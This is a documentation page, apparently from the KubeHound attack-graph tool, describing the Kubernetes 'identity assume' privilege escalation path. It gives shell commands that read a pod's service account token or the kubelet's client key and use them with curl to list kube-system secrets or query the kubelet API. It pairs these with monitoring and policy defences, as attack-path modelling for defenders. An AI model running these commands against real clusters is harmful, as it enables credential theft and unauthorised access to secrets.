---
title: IDENTITY_ASSUME
---

<!--
id: IDENTITY_ASSUME
name: "Act as identity"
mitreAttackTechnique: T1078 - Valid Accounts
mitreAttackTactic: TA0004 - Privilege escalation
-->

# IDENTITY_ASSUME

| Source                                    | Destination                           | MITRE                            |
| ----------------------------------------- | ------------------------------------- |----------------------------------|
| [Container](../entities/container.md), [Node](../entities/node.md) | [Identity](../entities/identity.md)  | [Valid Accounts, T1078](https://attack.mitre.org/techniques/T1078/) |

Represents the capacity to act as an [Identity](../entities/identity.md) via ownership of a service account token, user PKI certificate, etc.

## Details

Authentication to the K8s API is performed via passing certificates, static tokens or OIDC tokens in the API request. This edge represents the ability to assume an identity using either acquired credentials (such as a service account token) or the intrinsic identity of a resource in K8s such as executing commands from inside a pod with a bound serviceaccount.

## Prerequisites

Control of execution within a container with a bound serviceaccount or access to a node file system.

## Checks

### Container 

Check for a mounted service account tokens or secrets:

```bash
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
```

### Node 

Check the kubelet configuration:

```bash
cat $NODE_ROOT/etc/kubernetes/kubelet.conf 
```

This should contain the paths of the kubelet user certificates that we can steal to impersonate the node user:

```yaml
users:
- name: default-auth
  user:
    client-certificate: /var/lib/kubelet/pki/kubelet-client-current.pem
    client-key: /var/lib/kubelet/pki/kubelet-client-current.pem
```

Check the file(s) are accessible:

```bash
ls -la $NODE_ROOT/var/lib/kubelet/pki/kubelet-client-current.pem
```

## Exploitation

### Container 

Assuming a valid token is recovered from e.g a mounted service account a token is found it can be used to interact with the K8s API, to potentially access new resources:

```bash
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
      https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/kube-system/secrets
```

### Node

The kubelet PKI certificates can be used to authenticate to either the kubelet or the K8s API:

```bash
 curl -k --cacert $NODE_ROOT/etc/kubernetes/pki/ca.crt --key $NODE_ROOT/var/lib/kubelet/pki/kubelet-client-current.pem --cert {$NODE_ROOT}/var/lib/kubelet/pki/kubelet-client-current.pem https://${NODE_IP}:10250/pods/ 
```

## Defences

### Monitoring

+ Monitor for installation and/or execution of kubectl within pods. This is anomalous activity but may be triggered by legitimate SRE or developer activities.
+ Interacting directly with the K8s API via non-standard tools e.g curl could be observed via the User-Agent field in audit logs. However, this is attacker controlled so should not be relied on.

### Implement security policies

Use a pod security policy or admission controller to prevent or limit the identities under which new pods can run.

## Calculation

+ [IdentityAssumeContainer](https://github.com/DataDog/KubeHound/tree/main/pkg/kubehound/graph/edge/identity_assume_container.go)
+ [IdentityAssumeNode](https://github.com/DataDog/KubeHound/tree/main/pkg/kubehound/graph/edge/identity_assume_node.go)

## References:  

+ [Official Kubernetes Documentation](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#authentication-strategies)
+ [CURLing the Kubernetes API](https://nieldw.medium.com/curling-the-kubernetes-api-server-d7675cfc398c)
+ [Kubelet API Overview](https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html)
+ [Node AuthN/AuthZ](https://kubernetes.io/docs/reference/access-authn-authz/node/)